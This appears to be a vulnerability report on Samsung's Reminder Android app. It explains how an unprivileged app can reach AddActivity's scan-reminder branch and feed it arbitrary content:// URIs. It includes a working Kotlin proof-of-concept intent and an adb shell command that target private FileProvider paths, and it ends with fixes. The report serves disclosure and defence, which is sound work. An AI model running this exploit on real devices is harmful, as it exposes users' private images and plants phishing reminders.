## [V-006] AddActivity â€” Unauthenticated Scan-Reminder Pipeline Abuse via `service_action_type=100` + `imageUris` (Chains with V-001)

**File:** `sources/com/samsung/android/app/reminder/ui/detail/add/AddActivity.java`
**Severity:** High (combined with V-001 â€” unprivileged attacker reaches this path)
**Class of flaw:** CWE-862 (missing authorization) + CWE-20 (unchecked content-URI input) + CWE-501 (trust boundary violation) + CWE-552 (files exposed via Samsung FileProvider chain).

### Summary
`AddActivity` is manifest-protected by `com.samsung.android.app.reminder.permission.action.REGISTER`, but V-001 shows `DetailActivity` (unprotected, exported) redirects arbitrary attacker-controlled intents to `AddActivity` via `intent.setClass(ctx, AddActivity.class); startActivity(intent);`, and the permission check is therefore skipped.

Inside `AddActivity.onCreate` (lines 265â€“322) the attacker's Intent can drive a **scan-reminder** pipeline branch:

```java
if (intent == 0 || !intent.hasExtra("service_action_type") || intent.getIntExtra("service_action_type", 0) != 100) {
    this.f29966q.l(intent);           // normal path â€” D.l(Intent)
    ...
}
// else: attacker set service_action_type = 100  â†’
ArrayList parcelableArrayListExtra = intent.getParcelableArrayListExtra("imageUris", Uri.class);
if (parcelableArrayListExtra == null || parcelableArrayListExtra.isEmpty()) {
    ... finish();
} else if (AbstractC3698w0.e(this)) {    // has READ_MEDIA_IMAGES ?
    C0(intent);                          // process URIs now
} else {
    O6.s.a(this).a("android.permission.READ_MEDIA_IMAGES"); // prompt user for perms
    // success â†’ C0(intent)
}
```

`C0(intent)` iterates the attacker-supplied `Uri[]` and feeds each through `C4245b.a(context, uri)` (a URI-to-local-path materialiser), then passes the successful list to `com.samsung.android.app.reminder.ui.quickadd.scanreminder.m0.f(...)` â†’ `m0.m(ctx, arrayList, null, true)` which persists them into the scan-reminder flow (creates scan-reminder entries from attacker-controlled imagery).

Because the reminder app itself holds `READ_MEDIA_IMAGES` and typically holds its own FileProvider grants for `com.samsung.android.app.reminder.fileprovider`, opening attacker-supplied URIs runs with the **reminder app's UID**, not the attacker's â€” giving the attacker a read-oracle for any content the reminder app can reach but the attacker cannot (e.g., other apps' `content://` providers that grant-by-package to `com.samsung.android.app.reminder`, files under the reminder app's private data dir exposed via its own FileProvider paths, media entries the attacker app doesn't hold the media permission for).

### Attacker model & capability
Any locally-installed, **unprivileged** app:

1. Chains V-001: crafts an Intent to `DetailActivity` carrying all "downstream" extras for `AddActivity`.
2. Receives a no-prompt launch of the `AddActivity` scan-reminder branch.
3. Feeds arbitrary `content://` URIs (e.g. `content://com.samsung.android.app.reminder.fileprovider/...`, `content://media/external/images/â€¦`, other 3rd-party provider URIs that whitelist Samsung apps) into the pipeline.
4. **Writes attacker imagery into the victim's scan-reminder DB**, creating fake reminders containing attacker OCR content (user later sees and trusts them â€” phishing-grade reminders in the victim's own Reminder UI).
5. When the URIs point to content only the reminder app can read, the resulting scan-reminder entry contains the **exfiltrated material** (e.g. OCR of a private image) â€” observable by the attacker if they can later read the reminder DB via other leaks (V-004 / V-005 provide exactly this read primitive).

### Additional sub-issue â€” Bundle "add_intent" Parcelable Intent smuggling
Lines 265â€“275:
```java
if (bundle == null || !bundle.containsKey("add_intent")) { intent = 0; }
else {
    ?? N8 = com.samsung.android.app.reminder.ui.detail.add.utils.g.n(bundle);
    intent = N8;
    if (N8 != 0) {
        N8.putExtra(WearContract.Subject.ACTION, N8);  // self-referential extra
        intent = N8;
    }
}
```
`g.n(Bundle)` deserializes a Parcelable `Intent` from `savedInstanceState.getParcelable("add_intent")`. Under OS-level state-restoration with an attacker-tainted Parcel (possible when the activity is killed and later restored after an attacker chained intents), this path re-enters `onCreate` with a **fresh attacker-controlled Intent** that has never passed any caller check â€” even the `getIntent()` the OS recorded is ignored. The subsequent `N8.putExtra(WearContract.Subject.ACTION, N8)` creates a self-embedded Intent extra, a well-known sink for **Parcelable deserialisation mismatches (pre-Android 13 "Intent-in-extra" gadgets)**.

### Proof-of-Concept (chained with V-001 â€” attacker needs **no** permissions)

```kotlin
// Unprivileged 3rd-party app
val attack = Intent(Intent.ACTION_VIEW).apply {
    // Reach DetailActivity (unprotected) â†’ it redirects to AddActivity
    setClassName(
        "com.samsung.android.app.reminder",
        "com.samsung.android.app.reminder.ui.detail.view.DetailActivity"
    )
    data = Uri.parse("uuid://reminder.uuid/dummy")
    // Downstream extras consumed by AddActivity.onCreate:
    putExtra("service_action_type", 100)
    putExtra("add_view_type", 1)
    // Attacker-controlled content:// URIs:
    val uris = arrayListOf<Uri>(
        Uri.parse("content://com.samsung.android.app.reminder.fileprovider/internal/secret.jpg"),
        Uri.parse("content://media/external/images/media/42"),
        Uri.parse("content://com.attacker.exfilprovider/bait.png")
    )
    putParcelableArrayListExtra("imageUris", uris)
    addFlags(
        Intent.FLAG_ACTIVITY_NEW_TASK or
        Intent.FLAG_GRANT_READ_URI_PERMISSION or
        Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
    )
    // ClipData variant if URIs need per-item grant:
    clipData = ClipData.newRawUri("img", uris[0]).apply {
        uris.drop(1).forEach { addItem(ClipData.Item(it)) }
    }
}
startActivity(attack)
```

**adb variant (no app needed â€” sanity check):**
```
adb shell am start -a android.intent.action.VIEW \
  -d "uuid://reminder.uuid/dummy" \
  -n com.samsung.android.app.reminder/com.samsung.android.app.reminder.ui.detail.view.DetailActivity \
  --ei service_action_type 100 \
  --esa imageUris "content://com.samsung.android.app.reminder.fileprovider/internal/secret.jpg,content://media/external/images/media/42"
```

### Root-cause fixes
1. Fix V-001 at the source â€” stop letting `DetailActivity` launder intents to `AddActivity`. This single fix removes the attacker's reach to the `service_action_type=100` branch.
2. Independently, have `AddActivity.onCreate` explicitly reject non-signature callers before entering the scan-reminder branch (`checkCallingOrSelfPermission(REGISTER)` or verify `getCallingPackage()` on entry, even though Android's permission model is bypassed via internal forwarding).
3. In `C0(intent)`, before calling `C4245b.a(ctx, uri)` on each URI, reject URIs whose authority isn't on an allow-list (e.g., `com.android.providers.media.*`) and refuse `content://com.samsung.android.app.reminder.fileprovider/â€¦` unless the caller holds `REGISTER`.
4. Remove the `add_intent`-parcelable path or replace `getParcelable("add_intent")` with `Bundle#getParcelable(String, Class)` + whitelist validation (component name, action, data) so that an attacker-tainted saved state cannot re-enter `onCreate` with a fresh full-control Intent.

